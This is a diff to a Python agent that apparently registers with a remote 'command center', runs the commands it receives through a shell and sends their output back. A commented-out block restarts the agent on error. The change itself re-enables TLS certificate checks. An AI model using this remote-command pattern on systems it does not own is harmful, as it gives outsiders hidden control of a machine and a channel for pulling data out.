@@ -5,10 +5,7 @@ import sys
 from subprocess import getoutput as execute
 from time import sleep
 
-import urllib3
 from requests import Session
-
-urllib3.disable_warnings()
 
 DEFAULT_HOSTNAME = 'localhost'
 
@@ -44,7 +41,8 @@ def send_command_output_to_server(session, shell_uuid, body_message, url):
             print(resp.text)
     except Exception as e:
         print('[{uuid}] Unexpected error: {error}'.format(error=e, uuid=shell_uuid))
-from subprocess import STDOUT as stdout
+
+
 def execute_command(command, current_work_dir=None):
     try:
         command_as_array = command.split(' ')
@@ -122,8 +120,6 @@ def get_shell_uuid(session,
 def communicate_with_command_center(options):
     hostname = options.hostname
     with Session() as session:
-        # who cares?
-        session.verify = False
         while True:
             base_url = 'https://{hostname}'.format(hostname=hostname)
             shell_uuid = get_shell_uuid(session, "{base_url}/init".format(base_url=base_url))
@@ -152,4 +148,3 @@ communicate_with_command_center(options)
 # except:
 #     # try to restart the agent in case of any error
 #     Popen([sys.argv[0], "--hostname", options.hostname])
-
